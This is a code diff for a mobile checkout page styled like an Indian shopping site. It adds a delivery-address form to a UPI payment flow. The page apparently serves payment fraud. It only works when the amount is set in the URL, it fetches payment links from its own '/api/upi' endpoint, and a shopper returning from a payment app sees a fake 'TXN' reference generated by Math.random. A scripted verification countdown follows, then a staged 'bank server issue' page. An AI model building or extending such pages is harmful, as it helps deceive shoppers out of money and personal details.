@@ -156,8 +156,13 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes scaleIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes pulseBox { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-        @keyframes breathe { 0%, 100% { box-shadow: 0 0 0 0 rgba(40,116,240,0.4); } 50% { box-shadow: 0 0 0 20px rgba(40,116,240,0); } }
+        @keyframes colorSpin {
+            0%   { transform: rotate(0deg);   border-top-color: #2874f0; }
+            25%  { transform: rotate(90deg);  border-top-color: #ff6b6b; }
+            50%  { transform: rotate(180deg); border-top-color: #51cf66; }
+            75%  { transform: rotate(270deg);  border-top-color: #ffd43b; }
+            100% { transform: rotate(360deg); border-top-color: #2874f0; }
+        }
 
         #qr-code { opacity: 0; transform: scale(.96); transition: .25s ease; }
         #qr-code.ready { opacity: 1; transform: scale(1); }
@@ -194,14 +199,6 @@
             animation: colorSpin 2s linear infinite;
         }
 
-        @keyframes colorSpin {
-            0%   { transform: rotate(0deg);   border-top-color: #2874f0; }
-            25%  { transform: rotate(90deg);  border-top-color: #ff6b6b; }
-            50%  { transform: rotate(180deg); border-top-color: #51cf66; }
-            75%  { transform: rotate(270deg);  border-top-color: #ffd43b; }
-            100% { transform: rotate(360deg); border-top-color: #2874f0; }
-        }
-
         .timer-text {
             font-size: 42px;
             font-weight: 700;
@@ -224,6 +221,151 @@
             border-radius: 3px;
             transition: width 1s linear;
         }
+
+        /* ADDRESS PAGE STYLES */
+        .address-page {
+            background: #fff;
+            min-height: 100vh;
+        }
+
+        .address-header {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid #e5e7eb;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .address-header h4 {
+            margin: 0;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .progress-step {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px 16px;
+            background: #fff;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .step-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .step-circle {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #2874f0;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .step-circle.inactive {
+            background: #fff;
+            border: 2px solid #e5e7eb;
+            color: #999;
+        }
+
+        .step-label {
+            font-size: 10px;
+            color: #666;
+        }
+
+        .step-line {
+            width: 40px;
+            height: 2px;
+            background: #e5e7eb;
+        }
+
+        .form-floating {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .form-floating input, .form-floating select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .form-floating label {
+            position: absolute;
+            left: 12px;
+            top: 12px;
+            color: #999;
+            font-size: 14px;
+            transition: 0.2s;
+            pointer-events: none;
+            background: #fff;
+            padding: 0 4px;
+        }
+
+        .form-floating input:focus + label,
+        .form-floating input:not(:placeholder-shown) + label,
+        .form-floating select:focus + label,
+        .form-floating select:not([value=""]) + label {
+            top: -8px;
+            font-size: 11px;
+            color: #2874f0;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .form-row .form-floating {
+            flex: 1;
+        }
+
+        .save-address-btn {
+            width: 90%;
+            margin: 20px auto;
+            padding: 14px;
+            background: #ff6b00;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: block;
+            text-align: center;
+        }
+
+        .save-address-btn:hover {
+            background: #e55e00;
+        }
+
+        .shipping-banner {
+            margin: 12px 16px;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .shipping-banner img {
+            width: 100%;
+            border-radius: 8px;
+        }
     </style>
 </head>
 
@@ -237,7 +379,114 @@
         </div>
     </div>
 
-    <!-- MAIN PAYMENT PAGE -->
+    <!-- ADDRESS PAGE -->
+    <div id="address-page" style="display:none;">
+        <div class="address-page">
+            <div class="address-header">
+                <div style="margin-right: 12px; cursor: pointer;" id="back-btn">
+                    <svg width="19" height="16" viewBox="0 0 19 16" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M17.556 7.847H1M7.45 1L1 7.877l6.45 6.817" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    </svg>
+                </div>
+                <h4>Add delivery address</h4>
+            </div>
+
+            <div class="progress-step">
+                <div class="step-item">
+                    <div class="step-circle">1</div>
+                    <span class="step-label">Address</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step-item">
+                    <div class="step-circle inactive">2</div>
+                    <span class="step-label">Order Summary</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step-item">
+                    <div class="step-circle inactive">3</div>
+                    <span class="step-label">Payment</span>
+                </div>
+            </div>
+
+            <div style="padding: 16px;">
+                <form id="addressForm">
+                    <div class="form-floating">
+                        <input type="text" id="name" placeholder=" " required />
+                        <label>Full Name (Required)*</label>
+                    </div>
+                    <div class="form-floating">
+                        <input type="tel" id="number" placeholder=" " required />
+                        <label>Mobile number (Required)*</label>
+                    </div>
+                    <div class="form-floating">
+                        <input type="number" id="pin" placeholder=" " required />
+                        <label>Pincode (Required)*</label>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-floating">
+                            <input type="text" id="city" placeholder=" " required />
+                            <label>City (Required)*</label>
+                        </div>
+                        <div class="form-floating">
+                            <select id="state" style="padding: 12px; background: #fff;">
+                                <option value="AP">Andhra Pradesh</option>
+                                <option value="AR">Arunachal Pradesh</option>
+                                <option value="AS">Assam</option>
+                                <option value="BR">Bihar</option>
+                                <option value="CT">Chhattisgarh</option>
+                                <option value="GA">Goa</option>
+                                <option value="GJ">Gujarat</option>
+                                <option value="HR">Haryana</option>
+                                <option value="HP">Himachal Pradesh</option>
+                                <option value="JK">Jammu & Kashmir</option>
+                                <option value="JH">Jharkhand</option>
+                                <option value="KA">Karnataka</option>
+                                <option value="KL">Kerala</option>
+                                <option value="MP">Madhya Pradesh</option>
+                                <option value="MH">Maharashtra</option>
+                                <option value="MN">Manipur</option>
+                                <option value="ML">Meghalaya</option>
+                                <option value="MZ">Mizoram</option>
+                                <option value="NL">Nagaland</option>
+                                <option value="OR">Odisha</option>
+                                <option value="PB">Punjab</option>
+                                <option value="RJ">Rajasthan</option>
+                                <option value="SK">Sikkim</option>
+                                <option value="TN">Tamil Nadu</option>
+                                <option value="TS">Telangana</option>
+                                <option value="TR">Tripura</option>
+                                <option value="UK">Uttarakhand</option>
+                                <option value="UP">Uttar Pradesh</option>
+                                <option value="WB">West Bengal</option>
+                                <option value="AN">Andaman & Nicobar</option>
+                                <option value="CH">Chandigarh</option>
+                                <option value="DN">Dadra and Nagar Haveli</option>
+                                <option value="DD">Daman & Diu</option>
+                                <option value="DL">Delhi</option>
+                                <option value="LD">Lakshadweep</option>
+                                <option value="PY">Puducherry</option>
+                            </select>
+                            <label>State (Required)*</label>
+                        </div>
+                    </div>
+                    <div class="form-floating">
+                        <input type="text" id="flat" placeholder=" " required />
+                        <label>House No., Building Name (Required)*</label>
+                    </div>
+                    <div class="form-floating">
+                        <input type="text" id="area" placeholder=" " required />
+                        <label>Road name, Area, Colony (Required)*</label>
+                    </div>
+                    <div class="shipping-banner">
+                        <img src="https://i.ibb.co/8b0zYpX/free-shipping.png" alt="Free Shipping" />
+                    </div>
+                    <button type="submit" class="save-address-btn">Save Address</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAYMENT PAGE -->
     <div id="main-page">
         <header>
             <div class="flex items-center justify-between">
@@ -367,7 +616,7 @@
                     </div>
                 </div>
 
-                <!-- VERIFICATION PAGE (after returning from app) -->
+                <!-- VERIFICATION PAGE -->
                 <div id="verifyPaymentOverlay" style="display:none; position:fixed; inset:0; background:#fff; z-index:999999; overflow-y:auto;">
                     <div style="max-width:480px; margin:0 auto; padding:40px 24px; text-align:center;">
                         <div class="color-spinner"></div>
@@ -378,11 +627,10 @@
                         <div class="progress-bar">
                             <div class="progress-fill" id="verifyProgress" style="width:100%;"></div>
                         </div>
-
                     </div>
                 </div>
 
-                <!-- BANK SERVER ISSUE PAGE (after timer ends) -->
+                <!-- BANK SERVER ISSUE PAGE -->
                 <div id="bankIssueOverlay" style="display:none; position:fixed; inset:0; background:#fff; z-index:999999; overflow-y:auto;">
                     <div style="max-width:480px; margin:0 auto; padding:40px 24px; text-align:center;">
                         <div style="width:80px; height:80px; border-radius:50%; background:#fff3e0; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
@@ -454,24 +702,36 @@
 
         document.addEventListener('DOMContentLoaded', function() {
             const urlParams = new URLSearchParams(window.location.search);
+            const search = window.location.search;
 
-            // Check URL format: ?amount=xxx or ?=xxx
+            // Check URL format
             let amountParam = urlParams.get('amount');
+            let isAddress = false;
+            let amount = null;
+
             if (!amountParam) {
-                // Check for ?=xxx format (parameter without name)
-                const search = window.location.search;
                 const match = search.match(/^\?=(\d+)$/);
                 if (match) {
-                    amountParam = match[1];
+                    amount = parseInt(match[1]);
+                }
+            } else {
+                amount = parseInt(amountParam);
+            }
+
+            // Check for address mode: ?=address?=100
+            if (search.includes('address')) {
+                isAddress = true;
+                const amtMatch = search.match(/=(\d+)$/);
+                if (amtMatch) {
+                    amount = parseInt(amtMatch[1]);
                 }
             }
 
-            const amount = amountParam ? parseInt(amountParam) : null;
-
-            // If no amount parameter, show block page
+            // If no amount, show block page
             if (!amount || isNaN(amount) || amount <= 0) {
                 document.getElementById('block-page').style.display = 'block';
                 document.getElementById('main-page').style.display = 'none';
+                document.getElementById('address-page').style.display = 'none';
                 document.body.style.background = '#fff';
                 return;
             }
@@ -481,16 +741,62 @@
             document.getElementById('btn-amount').textContent = '\u20b9' + amount;
             document.getElementById('qr_amt_modal_scan').textContent = amount;
 
-            initPaymentUrls();
-            initUPIPanel();
-            initFormChecks();
-            initModal();
-            initPaymentButtons();
+            if (isAddress) {
+                // Show address page
+                document.getElementById('address-page').style.display = 'block';
+                document.getElementById('main-page').style.display = 'none';
+                document.getElementById('block-page').style.display = 'none';
+                document.body.style.background = '#fff';
+                initAddressForm();
+            } else {
+                // Show payment page
+                document.getElementById('main-page').style.display = 'block';
+                document.getElementById('address-page').style.display = 'none';
+                document.getElementById('block-page').style.display = 'none';
 
-            // Check if returning from payment app
-            checkReturningFromApp();
+                initPaymentUrls();
+                initUPIPanel();
+                initFormChecks();
+                initModal();
+                initPaymentButtons();
+                checkReturningFromApp();
+            }
         });
 
+        // ========== ADDRESS PAGE ==========
+        function initAddressForm() {
+            const form = document.getElementById('addressForm');
+            const backBtn = document.getElementById('back-btn');
+
+            if (backBtn) {
+                backBtn.addEventListener('click', function() {
+                    window.history.back();
+                });
+            }
+
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+
+                    // Save address to localStorage
+                    const addressData = {
+                        name: document.getElementById('name').value,
+                        number: document.getElementById('number').value,
+                        pin: document.getElementById('pin').value,
+                        city: document.getElementById('city').value,
+                        state: document.getElementById('state').value,
+                        flat: document.getElementById('flat').value,
+                        area: document.getElementById('area').value
+                    };
+                    localStorage.setItem('delivery_address', JSON.stringify(addressData));
+
+                    // Navigate to payment page
+                    window.location.href = window.location.pathname + '?=' + GLOBAL_AMOUNT;
+                });
+            }
+        }
+
+        // ========== PAYMENT PAGE ==========
         async function initPaymentUrls() {
             try {
                 const response = await fetch('/api/upi');
@@ -738,13 +1044,12 @@
             if (!overlay) return;
             overlay.style.display = 'block';
 
-            const totalSeconds = 300; // 5 minutes
+            const totalSeconds = 300;
             let remaining = totalSeconds;
             const timerEl = document.getElementById('verifyTimer');
             const progressEl = document.getElementById('verifyProgress');
             const txnRef = document.getElementById('txnRef');
 
-            // Generate random transaction reference
             if (txnRef) {
                 txnRef.textContent = 'TXN' + Math.floor(Math.random() * 9000000000 + 1000000000);
             }
@@ -776,15 +1081,12 @@
 
         // ========== RETURN FROM APP DETECTION ==========
         function checkReturningFromApp() {
-            // Check if we have a payment session marker
             if (localStorage.getItem('payment_in_progress')) {
                 const startTime = parseInt(localStorage.getItem('payment_start_time') || '0');
                 const now = Date.now();
-                // If more than 3 seconds passed, user likely went to app and came back
                 if (now - startTime > 3000) {
                     localStorage.removeItem('payment_in_progress');
                     localStorage.removeItem('payment_start_time');
-                    // Show verification
                     startVerifyTimer();
                     return;
                 }
@@ -792,7 +1094,6 @@
                 localStorage.removeItem('payment_start_time');
             }
 
-            // Also check via visibility API for when they come back
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible') {
                     if (localStorage.getItem('payment_in_progress')) {
@@ -808,13 +1109,11 @@
             });
         }
 
-        // Store payment intent when leaving for app
         function storePaymentIntent() {
             localStorage.setItem('payment_in_progress', 'true');
             localStorage.setItem('payment_start_time', Date.now().toString());
         }
 
-        // Override payNow to store intent
         const originalPayNow = payNow;
         payNow = function() {
             const active = document.querySelector('.form-check.active');
